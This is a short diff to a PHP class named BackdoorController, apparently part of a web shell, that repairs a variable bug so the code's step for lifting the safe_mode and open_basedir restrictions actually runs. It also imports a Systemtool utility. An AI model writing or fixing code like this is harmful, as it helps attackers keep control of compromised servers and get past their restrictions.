@@ -5,6 +5,7 @@
 namespace Codelib\Controller;
 
 use \Light\Mvc\Controller\ControllerAbstract as ControllerAbstract;
+use \Codelib\Util\Systemtool; 
 
 class BackdoorController extends ControllerAbstract
 {
@@ -235,7 +236,7 @@ class BackdoorController extends ControllerAbstract
         @set_magic_quotes_runtime(0);
 
         $this->safeMode = (ini_get('safe_mode') || strtolower(ini_get('safe_mode')) == 'on') ? true : false;
-        if ($safeMode) {
+        if ($this->safeMode) {
             ini_restore('safe_mode');
             ini_restore('open_basedir');
         }
